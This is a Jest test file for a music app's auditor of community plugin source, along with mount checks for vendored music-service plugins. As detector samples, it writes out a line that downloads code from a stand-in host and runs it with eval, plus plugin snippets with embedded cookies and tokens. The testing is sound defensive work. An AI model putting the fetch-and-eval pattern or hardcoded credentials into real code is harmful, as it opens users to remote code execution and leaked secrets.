import { Plugin, PluginState } from "../../../plugin";
import {
    auditCommunityPluginSource,
    CommunitySourcePolicy,
} from "../communitySourcePolicy";
import NETEASE_MANAGED_PLUGIN from "../sources/neteasePluginSource";
import QQ_MANAGED_PLUGIN from "../sources/qqPluginSource";
import KUWO_MANAGED_PLUGIN from "../sources/kuwoPluginSource";
import MIGU_MANAGED_PLUGIN from "../sources/miguPluginSource";
import XIMALAYA_MANAGED_PLUGIN from "../sources/ximalayaPluginSource";

jest.mock("@/utils/log", () => ({
    devLog: jest.fn(),
    errorLog: jest.fn(),
    trace: jest.fn(),
}));
jest.mock("@/constants/commonConst", () => ({
    CacheControl: {
        Cache: "cache",
        NoCache: "no-cache",
        NoStore: "no-store",
    },
    internalSerializeKey: "$",
    localPluginPlatform: "本地音乐",
}));
jest.mock("@/constants/pathConst", () => ({
    __esModule: true,
    default: { localLrcPath: "/tmp/lrc/", lrcCachePath: "/tmp/lrc-cache/" },
}));
jest.mock("react-native-fs", () => ({ __esModule: true, default: {} }));
jest.mock("@/native/mp3Util", () => ({ __esModule: true, default: {} }));
jest.mock("@/utils/delay", () => ({
    __esModule: true,
    default: jest.fn(async () => {}),
}));
jest.mock("@/utils/fileUtils", () => ({
    addFileScheme: (path: string) => path,
    getFileName: (path: string) => path,
}));
jest.mock("@/utils/mediaExtra", () => ({
    getMediaExtraProperty: jest.fn(),
    patchMediaExtra: jest.fn(),
}));
jest.mock("@/utils/mediaUtils", () => ({
    getLocalPath: jest.fn(),
    isSameMediaItem: jest.fn(),
    resetMediaItem: (item: unknown) => item,
}));
jest.mock("@/utils/network", () => ({
    __esModule: true,
    default: { isOffline: false },
}));
jest.mock("nanoid", () => ({ nanoid: () => "test-id" }));
jest.mock("react-native-url-polyfill", () => ({ URL }));
jest.mock("webdav", () => ({}));
jest.mock("../../../meta", () => ({
    __esModule: true,
    default: { getUserVariables: () => ({}) },
}));
jest.mock("@/core/i18n", () => ({
    __esModule: true,
    default: { getLanguage: () => ({ locale: "en-US" }) },
}));
jest.mock("@/core/mediaCache", () => ({
    __esModule: true,
    default: {
        getMediaCache: jest.fn(() => null),
        removeMediaCache: jest.fn(),
        setMediaCache: jest.fn(),
    },
}));
jest.mock("react-native-device-info", () => ({
    __esModule: true,
    default: { getVersion: () => "0.6.2" },
}));

const TEST_POLICY: CommunitySourcePolicy = {
    platform: "Test",
    allowedHosts: ["example.com"],
};

describe("community plugin source policy", () => {
    it("accepts a minimal HTTPS-only CommonJS plugin", () => {
        expect(auditCommunityPluginSource(
            "module.exports={platform:\"Test\",version:\"1.0.0\",getMediaSource:async()=>({url:\"https://media.example.com/a.mp3\"})}",
            TEST_POLICY,
        )).toEqual([]);
    });

    it("reports dynamic execution, HTTP, remote source, and unrelated hosts", () => {
        const source = [
            "srcUrl: \"https://updates.invalid/plugin.js\"",
            "eval(await axios.get(\"http://relay.invalid/code\"))",
            "new Function(\"return 1\")",
            "Function(\"return 2\")",
        ].join("\n");

        expect(auditCommunityPluginSource(source, TEST_POLICY)).toEqual([
            "dynamic-code-execution",
            "remote-source-url",
            "plaintext-http",
            "unapproved-host:relay.invalid",
            "unapproved-host:updates.invalid",
        ]);
    });

    it("rejects literal credentials but permits only exact anonymous placeholders", () => {
        expect(auditCommunityPluginSource(
            "const cookie = \"session=secret\"; const token = \"abc\";",
            TEST_POLICY,
        )).toContain("embedded-credential");

        const qqPolicy: CommunitySourcePolicy = {
            ...TEST_POLICY,
            allowedAnonymousCredentialLiterals: ["uin="],
        };
        expect(auditCommunityPluginSource(
            "const headers = { Cookie: \"uin=\" };",
            qqPolicy,
        )).toEqual([]);
        expect(auditCommunityPluginSource(
            "const headers = { Cookie: \"uin=123\" };",
            qqPolicy,
        )).toContain("embedded-credential");
        expect(auditCommunityPluginSource(
            "const headers = { authorization: `Bearer secret` };",
            TEST_POLICY,
        )).toContain("embedded-credential");
        expect(auditCommunityPluginSource(
            "const request = { loginUin: 123456 };",
            TEST_POLICY,
        )).toContain("embedded-credential");
        expect(auditCommunityPluginSource(
            "axios.get(\"https://example.com/a?uin=123456\")",
            TEST_POLICY,
        )).toContain("embedded-credential");
        expect(auditCommunityPluginSource(
            "axios.get(\"https://example.com/a?data=%7B%22comm%22%3A%7B%22uin%22%3A123456%7D%7D\")",
            TEST_POLICY,
        )).toContain("embedded-credential");
        expect(auditCommunityPluginSource(
            "axios.get(\"https://example.com/a?loginUin=0&hostUin=0\")",
            TEST_POLICY,
        )).toEqual([]);
        expect(auditCommunityPluginSource(
            "axios.get(\"https://user:password@example.com/a?token=secret\")",
            TEST_POLICY,
        )).toContain("embedded-credential");
    });

    it("treats schemes and hostnames case-insensitively", () => {
        expect(auditCommunityPluginSource(
            "axios.get(\"HTTP://MEDIA.EXAMPLE.COM/a\")",
            TEST_POLICY,
        )).toEqual(["plaintext-http"]);
        expect(auditCommunityPluginSource(
            "const plugin = { \"SRCURL\": \"https://example.com/a.js\" };",
            TEST_POLICY,
        )).toEqual(["remote-source-url"]);
        expect(auditCommunityPluginSource(
            "const artwork = `http:${path}`;",
            TEST_POLICY,
        )).toEqual(["plaintext-http"]);
        expect(auditCommunityPluginSource(
            "const artwork = \"http:\" + path;",
            TEST_POLICY,
        )).toEqual(["plaintext-http"]);
    });

    it("does not mutate or alias policy inputs or results", () => {
        const allowedHosts = ["example.com"];
        const policy = { platform: "Test", allowedHosts };
        const result = auditCommunityPluginSource(
            "axios.get(\"https://bad.invalid/a\")",
            policy,
        );

        allowedHosts.push("bad.invalid");
        expect(result).toEqual(["unapproved-host:bad.invalid"]);
        expect(Object.isFrozen(result)).toBe(true);
    });
});

describe("vendored community plugin descriptors", () => {
    const descriptors = [
        NETEASE_MANAGED_PLUGIN,
        QQ_MANAGED_PLUGIN,
        KUWO_MANAGED_PLUGIN,
        MIGU_MANAGED_PLUGIN,
        XIMALAYA_MANAGED_PLUGIN,
    ];

    it.each(descriptors)("mounts $platform at $version", descriptor => {
        const plugin = new Plugin(
            descriptor.source,
            `managed-plugin://${descriptor.platform}`,
        );

        expect(plugin.state).toBe(PluginState.Mounted);
        expect(plugin.name).toBe(descriptor.platform);
        expect(plugin.instance.version).toBe(descriptor.version);
        expect(plugin.hash).not.toHaveLength(0);
        expect(Object.isFrozen(descriptor)).toBe(true);
    });

    it("keeps QQ anonymous and Migu artwork HTTPS-only", () => {
        expect(QQ_MANAGED_PLUGIN.source).not.toContain(
            "%22uin%22%3A123456",
        );
        expect(QQ_MANAGED_PLUGIN.source).toContain("%22uin%22%3A0");
        expect(auditCommunityPluginSource(QQ_MANAGED_PLUGIN.source, {
            platform: "QQ音乐",
            allowedHosts: ["y.qq.com", "gtimg.cn", "qqmusic.qq.com"],
            allowedAnonymousCredentialLiterals: ["uin="],
        })).toEqual([]);

        expect(MIGU_MANAGED_PLUGIN.source).not.toContain("`http:${");
        expect(MIGU_MANAGED_PLUGIN.source).toContain("`https:${");
        expect(auditCommunityPluginSource(MIGU_MANAGED_PLUGIN.source, {
            platform: "咪咕",
            allowedHosts: ["migu.cn"],
        })).toEqual([]);
    });
});
